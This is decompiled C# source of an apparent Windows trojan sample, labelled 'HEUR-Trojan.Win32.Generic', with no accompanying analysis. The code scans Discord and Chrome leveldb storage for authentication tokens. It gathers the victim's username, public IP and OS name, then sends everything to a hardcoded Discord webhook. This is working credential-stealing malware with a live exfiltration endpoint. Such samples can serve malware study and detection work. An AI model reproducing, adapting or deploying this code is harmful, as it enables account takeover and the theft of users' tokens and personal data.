// Decompiled with JetBrains decompiler
// Type: iFnyOrKXHQa.hmYYUeuIpN
// Assembly: deinvater, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 89B491E0-9EDA-4D26-ADB9-208707ED33ED
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-561b48f813af5f638c5f305d21a716998cce9e0ce1ea3374fd118cec5f725885.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using System.Threading;

namespace iFnyOrKXHQa
{
  internal class hmYYUeuIpN
  {
    public static void Main(string egYHpqqfYtEyik)
    {
      string PcCvFDhzziOMh = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
      if (!hmYYUeuIpN.jphQxoLFoQQBN(ref PcCvFDhzziOMh))
        hmYYUeuIpN.jphQxoLFoQQBN(ref PcCvFDhzziOMh);
      Thread.Sleep(100);
      string str1 = hmYYUeuIpN.IucEGdQRGud(PcCvFDhzziOMh, PcCvFDhzziOMh.EndsWith(".log"));
      if (str1 == "")
        str1 = "N/A";
      string dpdKNSXuUWrtji = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\";
      if (!hmYYUeuIpN.jphQxoLFoQQBN(ref dpdKNSXuUWrtji))
        hmYYUeuIpN.MACuXbIEjdcn(ref dpdKNSXuUWrtji);
      Thread.Sleep(100);
      string str2 = hmYYUeuIpN.IucEGdQRGud(dpdKNSXuUWrtji, dpdKNSXuUWrtji.EndsWith(".log"));
      if (str2 == "")
        str2 = "N/A";
      using (jaqmMqKhKd jaqmMqKhKd = new jaqmMqKhKd())
      {
        foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("select * from Win32_OperatingSystem").Get())
        {
          string str3 = managementBaseObject["Caption"].ToString();
          jaqmMqKhKd.MjcIjwxRoUpmG = "https://www.techniknews.net/wp-content/uploads/2018/07/discord-logo.jpg";
          jaqmMqKhKd.pPlEIUExLOsHy = egYHpqqfYtEyik;
          jaqmMqKhKd.zdxCEAuxzhwFJB = "https://discord.com/api/webhooks/780783005307895818/1tcNqwidYko-32qqkw7-SN35HpBY-1NoZHwFmRnTSgREpOcu2U100R8msRM4yvbXIHEy";
          jaqmMqKhKd.qvxllaHfQE("```UserName: " + Environment.UserName + Environment.NewLine + "IP: " + hmYYUeuIpN.GayLdFpcFpZTBz() + Environment.NewLine + "OS: " + str3 + Environment.NewLine + "Token DiscordAPP: " + str1 + Environment.NewLine + "Token Chrome: " + str2 + "```");
        }
      }
    }

    public static string GayLdFpcFpZTBz() => new WebClient().DownloadString("http://ipv4bot.whatismyipaddress.com/");

    private static bool MACuXbIEjdcn(ref string AVlZxqsqddNs)
    {
      if (!Directory.Exists(AVlZxqsqddNs))
        return false;
      foreach (FileInfo file in new DirectoryInfo(AVlZxqsqddNs).GetFiles())
      {
        if (file.Name.EndsWith(".log") && System.IO.File.ReadAllText(file.FullName).Contains("oken"))
        {
          AVlZxqsqddNs += file.Name;
          return AVlZxqsqddNs.EndsWith(".log");
        }
      }
      return AVlZxqsqddNs.EndsWith(".log");
    }

    private static string IucEGdQRGud(string dpdKNSXuUWrtji, bool ykkuuySjKKgtI = false)
    {
      string str1 = Encoding.UTF8.GetString(System.IO.File.ReadAllBytes(dpdKNSXuUWrtji));
      string str2 = "";
      string RJZYjIgdKxVvWW = str1;
      while (RJZYjIgdKxVvWW.Contains("oken"))
      {
        string[] strArray = hmYYUeuIpN.BQYtgGspRYu(RJZYjIgdKxVvWW).Split('"');
        str2 = strArray[0];
        RJZYjIgdKxVvWW = string.Join("\"", strArray);
        if (ykkuuySjKKgtI && str2.Length == 59)
          break;
      }
      return str2;
    }

    private static bool jphQxoLFoQQBN(ref string PcCvFDhzziOMh)
    {
      if (!Directory.Exists(PcCvFDhzziOMh))
        return false;
      foreach (FileInfo file in new DirectoryInfo(PcCvFDhzziOMh).GetFiles())
      {
        if (file.Name.EndsWith(".ldb") && System.IO.File.ReadAllText(file.FullName).Contains("oken"))
        {
          PcCvFDhzziOMh += file.Name;
          return PcCvFDhzziOMh.EndsWith(".ldb");
        }
      }
      return PcCvFDhzziOMh.EndsWith(".ldb");
    }

    private static string BQYtgGspRYu(string RJZYjIgdKxVvWW)
    {
      string[] collection = RJZYjIgdKxVvWW.Substring(RJZYjIgdKxVvWW.IndexOf("oken") + 4).Split('"');
      List<string> stringList = new List<string>();
      stringList.AddRange((IEnumerable<string>) collection);
      stringList.RemoveAt(0);
      return string.Join("\"", stringList.ToArray());
    }
  }
}
